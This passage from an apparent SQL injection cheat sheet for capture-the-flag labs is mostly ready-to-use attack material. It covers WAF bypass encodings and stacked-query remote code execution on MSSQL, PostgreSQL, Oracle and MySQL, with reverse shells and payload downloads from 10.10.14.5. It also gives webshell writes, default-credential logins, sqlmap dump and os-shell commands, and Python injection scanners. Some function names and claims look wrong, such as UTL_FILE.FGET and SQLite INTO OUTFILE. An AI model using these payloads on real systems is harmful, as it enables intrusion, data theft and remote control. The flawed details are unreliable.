curl --data-urlencode "id=1' UNION SELECT 1,2-- -" "http://target.htb/page.php"
```

### 1. Comment Obfuscation

```sql
/**/SELECT/**/1,2,3       # space replacement
SEL/**/ECT                 # keyword splitting
SEL<>ECT                   # null byte / angle bracket
SE%LECT                    # URL-encoded middle char
```

### 2. Case & Whitespace Tricks

```sql
SeLeCt 1,2,3               # random case
SELECT%0A1%0C,2%0D,3       # newline / form feed / CR as separator
SELECT`column`              # MySQL backtick quoting
SELECT"column"              # ANSI double-quote
```

### 3. Numeric & String Encoding

```sql
# Hex
SELECT 0x61646d696e          # 'admin' in hex (MySQL)
SELECT CHAR(97,100,109,105,110)  # 'admin' in CHAR()

# Char codes (MSSQL)
SELECT CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)

# Unicode / wide char
%df' OR 1=1-- -              # GBK bypass — magic quote neutralized in GBK
```

### 4. Logical Operator Substitution

```sql
# Replace common blocked keywords
' OR 1=1-- -                 →  ' || 1=1-- -
AND                          →  &&
NOT                          →  !
'='                          →  LIKE
EXTRACTVALUE                 →  UPDATEXML
SLEEP(5)                     →  BENCHMARK(5000000,MD5('a'))
```

### 5. HTTP Parameter Pollution (HPP)

```bash
# When the WAF checks the first parameter only
http://target.htb/search.php?q=clean&q=' OR 1=1-- -
```

### 6. Nested / Double URL Encoding

```bash
# Single encoding
' → %27

# Double encoding
' → %2527     # %25 = '%', so decodes to %27 → '
```

---

## Stacked Query to RCE — MSSQL xp_cmdshell

This is the most common RCE path in CTFs via SQLi on MSSQL.

```sql
-- Step 1: Check if xp_cmdshell exists
' UNION SELECT 1,name FROM master..sysobjects WHERE name='xp_cmdshell'-- -

-- Step 2: Enable xp_cmdshell (requires sa or sysadmin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -

-- Step 3: Execute commands
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC xp_cmdshell 'dir C:\'-- -
'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe'-- -
'; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd 10.10.14.5 4444'-- -

-- Step 4: Alternative — sp_OACreate (if xp_cmdshell is disabled)
'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;-- -
'; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT;
  EXEC sp_OAMethod @o,'Run',NULL,'cmd /c whoami > C:\Windows\Temp\out.txt'-- -
```

---

## PostgreSQL RCE Techniques

```sql
-- 1. COPY FROM PROGRAM (PG ≥ 9.3, requires superuser)
'; COPY (SELECT '') TO PROGRAM 'curl http://10.10.14.5/shell.sh|bash'-- -

-- Alternative: COPY FROM (read from program's stdout into a table)
'; CREATE TABLE cmd(t TEXT); COPY cmd FROM PROGRAM 'id'-- -
'; SELECT * FROM cmd-- -

-- 2. Large object export (UDF not needed on modern PG)
'; CREATE TABLE cmd(t TEXT); INSERT INTO cmd VALUES('<?php system($_GET["cmd"]); ?>');-- -
'; COPY cmd TO '/var/www/html/shell.php'-- -

-- 3. pg_read_file / pg_write_file (PG ≥ 9.3, requires superuser)
' UNION SELECT 1,pg_read_file('/etc/passwd',0,200)-- -
-- No native pg_write_file — use COPY or lo_export instead

-- 4. dblink (if extension is installed)
'; SELECT dblink_connect('host=10.10.14.5 user=postgres password=postgres dbname=postgres');-- -
```

---

## Oracle RCE / File Access

```sql
-- UTL_FILE (read/write files, requires CREATE DIRECTORY privilege)
-- Read a file
' UNION SELECT UTL_FILE.FGET('TEMP_DIR','file.txt') FROM dual-- -

-- UTL_HTTP (make outbound HTTP requests)
' UNION SELECT UTL_HTTP.REQUEST('http://10.10.14.5/'||global_name) FROM global_name-- -

-- DBMS_XSLPROCESSOR (XXE to read files on Oracle)
' UNION SELECT DBMS_XMLQUERY.getXml(
  '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>'
) FROM dual-- -
```

---

## MySQL UDF (User-Defined Function) RCE

When you have FILE privilege on MySQL, you can load a malicious shared library for RCE.

```bash
# 1. Check architecture and plugin directory
' UNION SELECT 1,@@plugin_dir-- -                    # e.g., /usr/lib/mysql/plugin/
' UNION SELECT 1,@@version_compile_os-- -             # e.g., debian-linux-gnu
' UNION SELECT 1,@@version_compile_machine-- -        # x86_64

# 2. Compile or download pre-compiled UDF (rapid7/metasploit)
# On attacker machine:
git clone https://github.com/mysqludf/lib_mysqludf_sys
# ... compile the right .so for the target architecture

# 3. Write the .so to the plugin directory via hex dump
# Dump the .so as hex on attacker machine
xxd -p lib_mysqludf_sys.so | tr -d '\n'

# 4. Load via SQL injection
' UNION SELECT 1,0xHEX_DUMP_HERE INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'-- -

# 5. Create the function and execute
'; CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so'-- -
'; SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')-- -

# Also available as SQLMap module
sqlmap -u "http://target.htb/page.php?id=1" --os-pwn --batch
```

---

## SQLite Injection

SQLite is common in mobile apps, local CTF databases, and lightweight web apps. Same principles apply but with limitations (no information_schema, limited functions).

```sql
-- Version check
' UNION SELECT 1,sqlite_version()-- -

-- List tables (SQLite's equivalent of information_schema)
' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table'-- -

-- List columns for a table (SQL is stored in sqlite_master.sql!)
' UNION SELECT 1,sql FROM sqlite_master WHERE type='table' AND tbl_name='users'-- -

-- Dump data
' UNION SELECT 1,group_concat(username||':'||password) FROM users-- -

-- File read (if not disabled)
' UNION SELECT 1,readfile('/etc/passwd')-- -

-- File write (webshell)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

## NoSQL Injection vs SQL Injection — Quick Distinction

| | SQL Injection | NoSQL Injection (MongoDB) |
| :-- | :----------- | :------------------------ |
| **Query operators** | `' OR 1=1--` | `{"$gt": ""}` |
| **Comments** | `--`, `#`, `/**/` | Not needed (JSON structure) |
| **Extraction** | `UNION SELECT` | `$regex`, `$where` |
| **Blind** | Boolean / Time-based | `$regex` character-by-character |
| **Tools** | sqlmap | NoSQLMap, nosqli |
| **Encoding** | URL, hex, char() | JSON / BSON |

---

## Useful Nmap Scripts

```bash
# MySQL enumeration
nmap -sV -p3306 --script mysql-* 10.129.1.10

# Check for empty root password
nmap -sV -p3306 --script mysql-empty-password 10.129.1.10

# Enumerate MySQL databases
nmap -sV -p3306 --script mysql-databases --script-args mysqluser=root,mysqlpass= 10.129.1.10

# Dump MySQL user hashes
nmap -sV -p3306 --script mysql-dump-hashes --script-args username=root,password= 10.129.1.10

# MSSQL info
nmap -sV -p1433 --script ms-sql-info 10.129.1.10

# MSSQL empty password
nmap -sV -p1433 --script ms-sql-empty-password 10.129.1.10

# MSSQL brute force
nmap -sV -p1433 --script ms-sql-brute 10.129.1.10

# PostgreSQL info
nmap -sV -p5432 --script pgsql-brute 10.129.1.10
```

---

## Direct Database Access Credentials Cheat Sheet

```bash
# === MySQL / MariaDB (TCP 3306) ===
mysql -h 10.129.1.10 -u root
mysql -h 10.129.1.10 -u root -p
mysql -h 10.129.1.10 -u admin -padmin
mysql -h 10.129.1.10 -u root -proot

# === PostgreSQL (TCP 5432) ===
psql -h 10.129.1.10 -U postgres
psql -h 10.129.1.10 -U postgres -W
psql -h 10.129.1.10 -U admin -d postgres

# === MSSQL (TCP 1433) ===
# impacket-mssqlclient (Linux — most reliable)
impacket-mssqlclient Administrator@10.129.1.10
impacket-mssqlclient sa:'password'@10.129.1.10

# sqsh (Linux — legacy TDS)
sqsh -S 10.129.1.10 -U sa -P 'password'

# sqlcmd (Windows — native)
sqlcmd -S 10.129.1.10 -U sa -P 'password'

# === Oracle (TCP 1521) ===
sqlplus scott/tiger@10.129.1.10:1521/ORCL

# === SQLite (local file) ===
sqlite3 database.db
sqlite3 /var/www/html/db/database.sqlite
```

---

## SQLMap Shortcuts — CTF Workflow

```bash
# 1. Quick detection
sqlmap -u "http://10.129.1.10/page.php?id=1" --batch --dbs

# 2. Dump all tables from a specific database
sqlmap -u "http://10.129.1.10/page.php?id=1" -D webapp --tables --batch

# 3. Dump a specific table
sqlmap -u "http://10.129.1.10/page.php?id=1" -D webapp -T users --dump --batch

# 4. Look for passwords/files/interesting columns
sqlmap -u "http://10.129.1.10/page.php?id=1" -D webapp -T users --columns --batch

# 5. Try OS shell (MySQL/MSSQL only)
sqlmap -u "http://10.129.1.10/page.php?id=1" --os-shell --batch

# 6. Read a specific file
sqlmap -u "http://10.129.1.10/page.php?id=1" --file-read="/etc/passwd" --batch

# 7. Interactive SQL shell
sqlmap -u "http://10.129.1.10/page.php?id=1" --sql-shell --batch
```

---

## Scripting — Python Templates

### Generic SQLi Tester

```python
#!/usr/bin/env python3
"""Quick SQLi detection script."""
import requests
import sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://target.htb/page.php?id=1"
PAYLOADS = [
    ("'", "syntax error"),                  # basic quote
    ('"', "syntax error"),                  # double quote
    ("' OR '1'='1", "always true"),         # OR bypass
    ("' AND '1'='2", "always false"),       # AND false
    ("' OR 1=1-- -", "comment OR"),         # MySQL comment
    ("' OR 1=1#", "hash comment"),          # MySQL hash comment
    ("' OR 1=1--", "double dash"),          # PostgreSQL/MSSQL
    ("admin'-- -", "login bypass"),         # login bypass
    ("' UNION SELECT NULL-- -", "union test"),    # union
    ("\\", "escape slash"),                 # escape character
]

print(f"[*] Testing {URL}")
baseline_len = len(requests.get(URL).text)
print(f"[*] Baseline response length: {baseline_len}")

for payload, desc in PAYLOADS:
    r = requests.get(URL + payload)
    diff = len(r.text) - baseline_len
    flag = "⚠️ " if abs(diff) > 50 or "error" in r.text.lower() or "warning" in r.text.lower() else "   "
    print(f"{flag}[{desc}] length={len(r.text)} (Δ{diff:+d}) — status={r.status_code}")
```

### Find Number of Union Columns

```python
#!/usr/bin/env python3
"""Find number of columns for UNION injection."""
import requests
import sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://target.htb/page.php?id=1"

print("[*] Finding column count...")
for i in range(1, 20):
    r = requests.get(URL + f"' ORDER BY {i}-- -")
    if "error" in r.text.lower() or "unknown column" in r.text.lower() or "warning" in r.text.lower():
        print(f"[!] Error at column {i} → columns = {i-1}")
        break
    else:
        print(f"    ORDER BY {i}: OK (len={len(r.text)})")
```

---

## CTF / HTB SQLi Workflow Checklist

1. **Map the app** — browse manually, note all parameters in URLs, POST bodies, cookies, and headers
2. **Test every parameter** with `'`, `"`, `\` — look for errors, 500s, different responses
3. **Identify the DBMS** — use fingerprint queries or `sqlmap --fingerprint`
4. **Choose your technique**:
   - Errors shown → **Error-based** (fastest)
   - Data reflected on page → **Union-based** (most powerful)
   - True/false difference → **Boolean blind** (script it)
   - No difference at all → **Time-based blind** (slow but works)
   - Neither works → **OOB** (requires network egress)
5. **Enumerate the database**:
   - Current database name
   - All tables
   - Interesting tables (users, admin, flag, secrets, config, accounts)
   - Column names
6. **Extract the data** — users/passwords, flags, API keys, config files
7. **Escalate if possible**:
   - Read files (`LOAD_FILE`, `pg_read_file`, `OPENROWSET`)
   - Write webshell (`INTO OUTFILE`, `COPY TO`)
   - RCE (`xp_cmdshell`, UDF, `COPY FROM PROGRAM`)
8. **If stuck**:
   - Try different encoding (URL, double URL, hex, char)
   - Test stacked queries (`;`)
   - Check for second-order injection
   - Try `--tamper` scripts with SQLMap
   - Look at the source code if you have it — grep for SQL queries

---

## Common SQLi Mistakes in CTFs

| Mistake | Fix |
| :------ | :-- |
| Forgetting URL encoding in the browser | Use `curl` or Burp Repeater, or `Ctrl+U` for URL-encoded payloads |
| Single quotes don't break out of the query | Try double quotes, backslash, parentheses, or no quote at all (integer context) |
| UNION SELECT NULL returns error | Try fewer NULLs or a different number of columns |
| Comment doesn't work | Try `-- -`, `--`, `#`, `/**/`, or `;` (stacked) |
| Error but no useful data | Try EXTRACTVALUE/UPDATEXML/POLYON (MySQL double query) |
| ORDER BY error at column 3 but UNION SELECT works with 2 | ORDER BY error = 3 columns → UNION SELECT NULL,NULL,NULL (3 NULLs) |
| Blind SQLi script hangs | Add timeout handling, check for rate limiting, add `--delay` |
| SQLMap finds nothing | Try `--level=5 --risk=3`, specify `--dbms`, or manually inject a tamper script |

---

## Installing Tools

```bash
# SQLMap (included in Kali/Parrot)
sudo apt install sqlmap                      # Debian/Kali
sudo pacman -S sqlmap                        # Arch

# impacket (for MSSQL client)
sudo apt install python3-impacket            # Debian/Kali
sudo pacman -S impacket                      # Arch
pip install impacket                          # pip (any distro)

# Database clients
sudo apt install mysql-client postgresql-client sqsh  # Debian/Kali
sudo pacman -S mysql-clients postgresql               # Arch
```

---

## References

- [SQLMap Official Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PentestMonkey — SQL Injection Cheat Sheets](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [Invicti — SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
